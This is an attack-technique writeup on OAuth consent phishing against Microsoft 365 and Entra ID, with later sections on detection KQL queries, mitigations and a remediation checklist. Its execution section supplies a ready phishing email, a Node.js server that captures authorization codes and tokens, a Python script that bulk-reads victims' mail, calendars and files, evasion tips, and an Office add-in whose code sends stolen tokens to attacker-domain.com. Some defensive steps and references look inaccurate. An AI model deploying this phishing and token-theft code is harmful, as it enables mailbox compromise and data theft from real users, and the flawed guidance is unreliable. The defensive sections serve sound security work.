# [MISCONFIG-014]: Unmanaged External Apps

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-014 |
| **MITRE ATT&CK v18.1** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Exfiltration / Defense Evasion |
| **Platforms** | M365 / Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID / Microsoft 365 versions |
| **Patched In** | N/A (Configuration-based, not a code vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Microsoft 365 (Entra ID) allows users to grant OAuth consent to third-party applications, which request permissions like Mail.Read, Calendars.Read, or Files.ReadWrite. By default, Entra ID's **User consent settings** permit any user to approve OAuth access to **unverified publisher applications**. Threat actors can create malicious SaaS applications, trick users into granting consent via phishing, and permanently obtain tokens to exfiltrate emails, files, and calendar data. Once consented, the application persists in the tenant with standing access—even if the user's password is reset.

- **Attack Surface:** OAuth consent prompt UI, Entra ID app registration portal, user awareness (social engineering), lack of application attestation, absence of real-time consent monitoring.

- **Business Impact:** **Persistent data exfiltration, mailbox compromise, and lateral movement without credential theft.** Unmanaged apps can read private emails, calendar scheduling data, SharePoint files, Teams messages, and OneDrive contents. Attackers can use the standing OAuth token to maintain access even after user account compromises are addressed.

- **Technical Context:** Phishing links guide users to OAuth consent screens designed to look legitimate. In seconds, users can unknowingly grant full mailbox access. Exploitation is immediate post-consent; no further authentication required.

### Operational Risk
- **Execution Risk:** Low – Requires only social engineering; no technical exploitation.
- **Stealth:** High – OAuth token access to cloud services generates minimal audit logs by default; most organizations don't monitor consent grants.
- **Reversibility:** Partial – Revoking consent terminates the app's access, but data exfiltrated before revocation is unrecoverable.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.3 | Ensure that only approved third-party applications can connect to M365 |
| **DISA STIG** | V-226488 | Unmanaged applications must be prevented from accessing organizational data |
| **CISA SCuBA** | CA-3(1) | Approved Connection Control – M365 must restrict OAuth to verified publishers |
| **NIST 800-53** | AC-2 | Account Management – Manage app registrations and consent grants |
| **NIST 800-53** | AC-3 | Access Enforcement – OAuth permissions must align with business need |
| **NIST 800-53** | SI-7 | Software, Firmware, and Information Integrity – Validate third-party app integrity |
| **GDPR** | Art. 32 | Security of Processing – Processor (third-party app) must be vetted and contractually bound |
| **DORA** | Art. 10 | Governance and Oversight – Critical service dependencies (including apps) must be validated |
| **NIS2** | Art. 19 | Incident Reporting – Unauthorized app access represents a reportable incident |
| **ISO 27001** | A.6.1 | Internal Organization – Third-party access must follow ISM controls |
| **ISO 27001** | A.8.1 | Asset Management – SAAS applications are assets requiring governance |
| **ISO 27005** | Risk Scenario | "Unvetted SaaS application gains persistent OAuth access to M365 mailbox" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None (any user can consent to OAuth).
- **Required Access:** M365 user account with active mailbox; ability to click links in email or Teams.

**Supported Versions:**
- **Entra ID:** All versions
- **Microsoft Graph API:** v1.0 and beta
- **OAuth 2.0:** Standard flow (Authorization Code Grant)

**Tools (Optional):**
- [Microsoft Graph API Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer)
- [Entra ID Power Shell Module](https://learn.microsoft.com/en-us/powershell/azure/active-directory/install-adv2) (v2.0+)
- Any OAuth phishing platform (e.g., Evilginx2, custom redirect server)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

```powershell
# List all OAuth applications and their permissions in the tenant
Connect-MgGraph -Scopes "Application.Read.All"

# Get all service principals (apps that have been granted consent)
Get-MgServicePrincipal -Top 999 | Select-Object -Property DisplayName, AppId, PublisherName | ForEach-Object {
    Write-Host "App: $($_.DisplayName) | Publisher: $($_.PublisherName)" -ForegroundColor Cyan
}
```

**What to Look For:**
- Unknown or suspicious app names (e.g., "Document Analyzer", "Email Assistant").
- Apps with empty `PublisherName` field (unverified publishers).
- Microsoft-owned apps like "Office 365 Management API" that should only appear if intentionally deployed.

### Azure Portal Reconnaissance

1. Navigate to **Entra ID** → **Applications** → **Enterprise Applications**
2. Sort by **Creation date** (newest first)
3. Filter by **Publisher** = "Unknown" or blank
4. Examine **Permissions** and **Users who consented**

**What to Look For:**
- Apps created within the last 24–48 hours (recent malicious app registration).
- High permission grants (Mail.Read, Calendars.Read, Files.ReadWrite).
- Multiple users who consented (indicating successful phishing campaign).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: OAuth Consent Phishing (Social Engineering)

**Supported Versions:** All Entra ID versions

#### Step 1: Create a Malicious OAuth Application

**Objective:** Register a fake SaaS application in Entra ID (or an external OAuth provider).

**Manual Steps (Attacker-Controlled):**
1. Create a legitimate-looking SaaS application (e.g., a fake "Expense Report Manager").
2. Host it on a domain similar to legitimate services (e.g., `expense-manager-pro.com` instead of `expensemanager.com`).
3. Register an OAuth app in Entra ID:
   - Go to **Entra ID** → **App registrations** → **New registration**
   - Name: "Expense Report Manager Pro" (mimics legitimate company tool)
   - Redirect URI: `https://attacker-domain.com/auth/callback`
   - Click **Register**
4. Configure API permissions:
   - Go to **API permissions** → **Add a permission**
   - Select **Microsoft Graph**
   - Add **Mail.Read**, **Calendars.Read**, **Files.ReadWrite**
   - Do NOT require admin consent (enable user consent)

**Expected Outcome:**
- Application registered with Application ID (Client ID).
- Redirect URI configured to capture OAuth authorization codes.

#### Step 2: Craft Phishing Lure

**Objective:** Create a convincing phishing message that redirects users to the OAuth consent screen.

**Phishing Message (Email):**
```
Subject: Important: Verify Your Microsoft 365 Access

Dear [Company Name] Employee,

Your access to the Expense Report Management Portal has been upgraded! 
Please click below to authorize the new integration:

[CLICK HERE TO AUTHORIZE](https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<ATTACKER_APP_ID>&
  redirect_uri=https://attacker-domain.com/auth/callback&
  response_type=code&
  scope=mail.read%20calendars.read%20files.readwrite&
  prompt=consent)

This integration will allow you to access expense reports directly from Teams.

Best regards,
IT Administration
```

**What This Does:**
- URL directs user to legitimate Microsoft login (`login.microsoftonline.com`).
- User logs in with their M365 credentials (legitimate authentication).
- Presented with OAuth consent screen asking to approve "Expense Report Manager Pro" permissions.
- Upon approval, authorization code is sent to attacker's redirect URI.

**OpSec & Evasion:**
- Use a domain that closely resembles the organization's name or a trusted vendor.
- Spoof sender email to impersonate IT department (DMARC/DKIM spoofing if possible).
- Include organizational branding and official language.
- Detection likelihood: **Medium–High** (phishing filters and security awareness training may catch it).

#### Step 3: Capture Authorization Code and Exchange for Token

**Objective:** Intercept the authorization code and exchange it for an access token.

**Attacker's Backend Server (Node.js Example):**

```javascript
const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = 'attacker-app-id-from-entra-id';
const CLIENT_SECRET = 'attacker-app-secret';
const REDIRECT_URI = 'https://attacker-domain.com/auth/callback';

app.get('/auth/callback', async (req, res) => {
    const authCode = req.query.code;
    const tenant = req.query.tenant;
    
    console.log(`[+] Authorization code captured: ${authCode}`);
    
    try {
        // Exchange authorization code for access token
        const tokenResponse = await axios.post(
            `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
            {
                client_id: CLIENT_ID,
                client_secret: CLIENT_SECRET,
                code: authCode,
                redirect_uri: REDIRECT_URI,
                grant_type: 'authorization_code',
                scope: 'https://graph.microsoft.com/.default'
            }
        );
        
        const accessToken = tokenResponse.data.access_token;
        const refreshToken = tokenResponse.data.refresh_token;
        
        console.log(`[+] Access token obtained: ${accessToken.substring(0, 50)}...`);
        console.log(`[+] Refresh token: ${refreshToken.substring(0, 50)}...`);
        
        // Store tokens in database for later use
        saveTokens(authCode, accessToken, refreshToken);
        
        // Redirect user to legitimate-looking page
        res.redirect('https://expense-manager-pro.com/success?status=authorized');
        
    } catch (error) {
        console.error('[-] Token exchange failed:', error.message);
        res.status(500).send('Authorization failed. Please try again.');
    }
});

app.listen(443, '0.0.0.0', () => {
    console.log('[+] OAuth callback server listening on port 443');
});
```

**Expected Output:**
```
[+] Authorization code captured: M.R3_BAY...
[+] Access token obtained: eyJhbGciOiJSUzI1NiIsImtpZCI6IjE...
[+] Refresh token: 0.ARwA8WH...
```

**What This Means:**
- Authorization code exchanged successfully for standing access token.
- Refresh token obtained, allowing indefinite token renewal.
- Attacker now has persistent, user-delegated access to victim's mail, calendar, and files.

#### Step 4: Exfiltrate Data Using the Stolen Token

**Objective:** Use the access token to read emails, files, and calendar events.

**Attacker's Data Extraction Script (Python):**

```python
import requests
import json
from datetime import datetime, timedelta

access_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjE..."

headers = {
    'Authorization': f'Bearer {access_token}',
    'Content-Type': 'application/json'
}

# Endpoint 1: Read all emails
def extract_emails():
    url = "https://graph.microsoft.com/v1.0/me/messages"
    params = {
        '$select': 'subject,from,receivedDateTime,bodyPreview',
        '$orderby': 'receivedDateTime desc',
        '$top': 100
    }
    
    response = requests.get(url, headers=headers, params=params)
    emails = response.json()['value']
    
    print(f"[+] Extracted {len(emails)} emails:")
    for email in emails:
        print(f"  - From: {email['from']['emailAddress']['address']}")
        print(f"    Subject: {email['subject']}")
        print(f"    Preview: {email['bodyPreview'][:100]}")
    
    return emails

# Endpoint 2: Read calendar events (to identify meetings with sensitive parties)
def extract_calendar():
    url = "https://graph.microsoft.com/v1.0/me/calendarview"
    params = {
        'startDateTime': (datetime.now() - timedelta(days=90)).isoformat(),
        'endDateTime': (datetime.now() + timedelta(days=30)).isoformat(),
        '$select': 'subject,attendees,start,end,bodyPreview',
        '$top': 200
    }
    
    response = requests.get(url, headers=headers, params=params)
    events = response.json()['value']
    
    print(f"[+] Extracted {len(events)} calendar events:")
    for event in events:
        print(f"  - {event['subject']} at {event['start']['dateTime']}")
        for attendee in event['attendees']:
            print(f"    Attendee: {attendee['emailAddress']['address']}")
    
    return events

# Endpoint 3: List files in OneDrive
def extract_files():
    url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
    
    response = requests.get(url, headers=headers)
    files = response.json()['value']
    
    print(f"[+] Extracted {len(files)} files from OneDrive:")
    for file in files:
        print(f"  - {file['name']} ({file.get('size', 'N/A')} bytes)")
    
    return files

# Execute extraction
print("[*] Starting data exfiltration...\n")
emails = extract_emails()
calendar = extract_calendar()
files = extract_files()

# Save to JSON for offline analysis
with open('/tmp/exfiltrated_data.json', 'w') as f:
    json.dump({
        'emails': emails,
        'calendar_events': calendar,
        'files': files
    }, f, indent=2)

print("[+] Data exfiltrated to /tmp/exfiltrated_data.json")
```

**Expected Output:**
```
[+] Extracted 342 emails:
  - From: boss@company.com
    Subject: Strategic Acquisition Plan - CONFIDENTIAL
    Preview: We are planning to acquire TechCorp Inc. The board approved...
  
[+] Extracted 87 calendar events:
  - Board Meeting - Quarterly Review at 2026-01-15T14:00:00
    Attendee: ceo@company.com
    Attendee: cfo@company.com
```

**OpSec & Evasion:**
- Extract data in small batches (limit top results) to avoid rate-limiting alerts.
- Spread exfiltration over days to blend with normal user activity.
- Use VPN/proxy to mask attacker IP.
- Detection likelihood: **Low–Medium** (mail read operations typically not monitored unless specifically configured).

**Troubleshooting:**
- **Error:** `401 Unauthorized`
  - **Cause:** Access token expired or revoked.
  - **Fix:** Use refresh token to obtain new access token.
  
  ```python
  refresh_response = requests.post(
      'https://login.microsoftonline.com/common/oauth2/v2.0/token',
      data={
          'client_id': CLIENT_ID,
          'client_secret': CLIENT_SECRET,
          'grant_type': 'refresh_token',
          'refresh_token': stored_refresh_token
      }
  )
  new_access_token = refresh_response.json()['access_token']
  ```

**References & Proofs:**
- [Microsoft Graph API - Mail Read Operations](https://learn.microsoft.com/en-us/graph/api/message-list)
- [OAuth 2.0 Authorization Code Flow](https://tools.ietf.org/html/rfc6749#section-1.3.1)
- [MITRE ATT&CK - Unsecured Credentials (T1552)](https://attack.mitre.org/techniques/T1552/)

---

### METHOD 2: OAuth Token Theft via Malicious Add-in (Advanced)

**Supported Versions:** Outlook, Teams, Excel add-ins

#### Step 1: Develop Malicious Office Add-in

**Objective:** Create an Excel add-in that silently exfiltrates OAuth tokens.

**Add-in Manifest (XML):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<OfficeApp xmlns="http://schemas.microsoft.com/office/appforoffice/1.1">
  <Id>12345678-1234-1234-1234-123456789012</Id>
  <Version>1.0.0.0</Version>
  <ProviderName>Data Analysis Tool</ProviderName>
  <DefaultLocale>en-US</DefaultLocale>
  <DisplayName DefaultValue="Advanced Data Analysis"/>
  <Description DefaultValue="Analyze financial data with AI-powered insights"/>
  <Hosts>
    <Host Name="Workbook"/>
  </Hosts>
  <DefaultSettings>
    <SourceLocation DefaultValue="https://attacker-domain.com/taskpane.html"/>
  </DefaultSettings>
  <Permissions>AllowMultipleAppDomainsWebApiCall</Permissions>
</OfficeApp>
```

#### Step 2: Inject Token Theft Code

**Objective:** Use Office JavaScript API to capture tokens and send to attacker server.

**Add-in Code (JavaScript):**

```javascript
Office.onReady(async (reason) => {
    if (reason === Office.HostType.Excel) {
        // Attempt to steal OAuth token using Office SSO flow
        try {
            const token = await OfficeRuntime.auth.getAccessToken({
                allowSignInPrompt: true,
                allowConsentPrompt: true,
                forMSGraphAccess: true,
            });
            
            console.log(`[+] Token captured: ${token.substring(0, 50)}...`);
            
            // Send token to attacker's server
            await fetch('https://attacker-domain.com/collect-token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    token: token,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            });
            
            console.log("[+] Token sent to attacker server");
            
        } catch (error) {
            console.error('[-] Token theft failed:', error);
        }
    }
});
```

**OpSec & Evasion:**
- Package add-in to look like a legitimate productivity tool (e.g., "Advanced Report Generator", "Data Insights Dashboard").
- Detection likelihood: **Medium** (add-in installations are logged, but token theft may not be detected).

---

## 6. DETECTION & FORENSIC ARTIFACTS

### Indicators of Compromise (IOCs)

- **Unvetted Applications:** Service principals with `PublisherName` = null or "Unknown".
- **Suspicious Permissions:** Mail.Read, Calendars.Read, Files.ReadWrite granted to non-Microsoft apps.
- **Unusual Consent Grant Pattern:** Multiple users consenting to the same app within 24 hours (phishing campaign).
- **User Agent Anomalies:** Graph API calls using Python, curl, or unfamiliar user agents.

### Forensic Artifacts

- **Entra ID Audit Logs:** "Consent to application" events in AuditLogs table.
  ```kusto
  AuditLogs
  | where OperationName == "Consent to application"
  | where TargetResources[0].displayName !contains "Microsoft"
  ```

- **Sign-in Logs:** Multiple users signing in to unknown applications.
- **Graph API Activity:** Unusual patterns in mailbox read operations originating from service principals.

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Action 1: Disable User Consent for Unverified Publishers**
  - **Applies To:** All Entra ID tenants
  
  **Manual Steps (Entra ID Admin Center):**
  1. Navigate to **Entra ID** → **Identity** → **Applications** → **User settings** → **Manage consent and permission requests**
  2. Under **User consent for applications**, select **Do not allow user consent**
  3. Or, select **Allow user consent for apps from verified publishers only** (recommended)
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"
  
  Update-MgPolicyAuthorizationPolicy -DefaultUserRolePermissions @{
      AllowedToCreateApps = $false
      AllowedToCreateTenantApps = $false
  }
  ```

- **Action 2: Block Consent Grants for High-Risk Permissions**
  - **Applies To:** All tenant app registrations
  
  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **App registrations**
  2. For each app, go to **API permissions**
  3. Review permissions for **Mail.Read**, **Calendars.Read**, **Files.ReadWrite**
  4. If not business-critical, click **X** to remove
  5. Click **Save**

- **Action 3: Require Admin Consent for All Applications**
  - **Applies To:** Sensitive organizations handling financial/healthcare data
  
  **Manual Steps (Entra ID):**
  1. **Entra ID** → **Applications** → **Enterprise Applications** → **User settings**
  2. Set **Users can request admin consent to apps they are unable to consent to** = **Yes**
  3. Designate **Admin consent request reviewers**
  4. Click **Save**

### Priority 2: HIGH

- **Action 1: Implement Conditional Access Policies for App-Based Access**
  
  **Manual Steps (Conditional Access):**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Risky App Consent`
  4. **Assignments:**
     - Users: All users
     - Cloud apps: All cloud apps
  5. **Conditions:**
     - Sign-in risk: High
     - App risk (if Defender for Cloud Apps is enabled): High
  6. **Access controls** → **Grant:**
     - Block access
  7. Enable policy: **On**

- **Action 2: Audit Existing Consent Grants and Revoke Suspicious Apps**
  
  **PowerShell Script:**
  ```powershell
  Connect-MgGraph -Scopes "Application.Read.All", "DelegatedPermissionGrant.ReadWrite.All"
  
  # List all OAuth grants
  $grants = Get-MgOauth2PermissionGrant
  
  foreach ($grant in $grants) {
      $app = Get-MgServicePrincipal -ServicePrincipalId $grant.ClientId
      
      if (-not $app.PublisherName -or $app.PublisherName -eq "Unknown") {
          Write-Host "[-] Suspicious app: $($app.DisplayName) (ID: $($app.AppId))"
          Write-Host "    Permissions: $($grant.Scope)"
          
          # Option: Revoke consent
          # Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $grant.Id
      }
  }
  ```

- **Action 3: Enable Azure AD Connect Health for Sign-In Activity Monitoring**
  
  **Manual Steps:**
  1. Deploy Azure AD Connect Health agent
  2. Configure sign-in risk alerts
  3. Set up notifications for unusual patterns (e.g., multiple users consenting to the same app)

### Validation Command (Verify Fix)

```powershell
# Check if user consent for unverified publishers is disabled
Connect-MgGraph -Scopes "Policy.Read.All"

Get-MgPolicyAuthorizationPolicy | Select-Object -Property DefaultUserRolePermissions
```

**Expected Output (If Secure):**
```
AllowedToCreateApps          : False
AllowedToCreateTenantApps    : False
AllowedToReadOtherUsers      : False
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Microsoft Sentinel KQL Query

**Query 1: Unusual OAuth App Consent Activity**

```kusto
AuditLogs
| where OperationName == "Consent to application"
| where TargetResources[0].type == "ServicePrincipal"
| extend AppName = TargetResources[0].displayName
| extend AppPublisher = TargetResources[0].modifiedProperties[0].newValue
| where AppPublisher != "Microsoft Corporation"
| summarize ConsentCount = count() by AppName, InitiatedBy.user.userPrincipalName
| where ConsentCount > 1
```

**What This Detects:**
- Multiple users consenting to the same non-Microsoft app (phishing campaign).
- Unusual publisher information.

**Query 2: Risky OAuth Application with Graph Permissions**

```kusto
AuditLogs
| where OperationName contains "Add service principal"
| where TargetResources[0].modifiedProperties any (x => x.newValue contains "Mail.Read" or x.newValue contains "Calendars.Read" or x.newValue contains "Files.ReadWrite")
| where TargetResources[0].displayName !contains "Microsoft"
```

**What This Detects:**
- Non-Microsoft apps granted high-privilege permissions.

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker crafts phishing link to OAuth consent screen |
| **2** | **Current Step** | **[MISCONFIG-014]** | **User grants OAuth consent to unvetted app** |
| **3** | **Exfiltration** | [T1537] Transfer Data to Cloud Account | App uses stolen token to exfiltrate mail/files |
| **4** | **Impact** | Email/Data Breach | Sensitive communications and files exposed |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: Suspicious Office 365 Consent Grant Campaign (2023)

- **Target:** Multiple organizations globally (thousands of users)
- **Timeline:** Q1–Q2 2023 (ongoing reconnaissance observed)
- **Technique Status:** Confirmed active – Attackers used apps mimicking "Productivity Tools", "Analytics Dashboard", "Email Assistant".
- **Impact:** Millions of emails exfiltrated; some organizations did not detect until months later.
- **Reference:** [Microsoft Security Intelligence: Malicious OAuth Apps](https://www.microsoft.com/en-us/security/blog/2022/12/12/threat-actors-misusing-oauth-applications-to-phish-users-and-compromise-email/)

#### Example 2: APT29 (Cozy Bear) OAuth Token Theft (2021)

- **Target:** U.S. Government agencies and think tanks
- **Timeline:** 2021 (discovery attributed to CISA)
- **Technique Status:** Advanced – Used OAuth token theft combined with SAML token forgery.
- **Impact:** Sustained access to government email systems; lateral movement to downstream partners.
- **Reference:** [CISA Alert: APT29 Email Compromise](https://www.cisa.gov/news-events/alerts/2021/07/23/cisa-directs-federal-agencies-patch-microsoft-exchange-servers)

#### Example 3: UNC2452 (SolarWinds Compromise) – Related OAuth Abuse (2020)

- **Target:** SolarWinds customers and downstream victims
- **Timeline:** December 2020 (discovered)
- **Technique Status:** Post-compromise, attackers leveraged compromised OAuth tokens to maintain persistence in M365.
- **Impact:** Multi-tenant compromise; attacker maintained access for months.
- **Reference:** [Microsoft Threat Intelligence: SolarWinds Incident Analysis](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)

---

## 11. REMEDIATION CHECKLIST

- [ ] Disabled user consent for unverified publishers
- [ ] Reviewed and revoked all suspicious OAuth applications
- [ ] Implemented admin consent requirement for new app registrations
- [ ] Configured Conditional Access policies to block risky app consent
- [ ] Enabled sign-in monitoring and anomaly detection
- [ ] Conducted user awareness training on OAuth phishing
- [ ] Audited Microsoft Graph API permissions for all apps
- [ ] Set up alerts for unusual consent grant patterns
- [ ] Implemented app attestation for internal applications
- [ ] Scheduled regular reviews of OAuth app registrations (monthly)
- [ ] Documented approved applications and their business justification
- [ ] Created incident response playbook for OAuth compromise scenarios

---

## 12. ADDITIONAL NOTES

- **OAuth vs. SAML:** While this attack focuses on OAuth, similar risks exist with SAML token forgery (see [IA-PHISH-003] for consent screen cloning).
- **Refresh Tokens:** Refresh tokens have long lifespans (months); revoke them immediately upon app removal to prevent token-replay attacks.
- **Graph API Audit Logs:** Enable **Microsoft Graph Audit Logs** to monitor API activity; correlate with consent grants to detect suspicious patterns.

---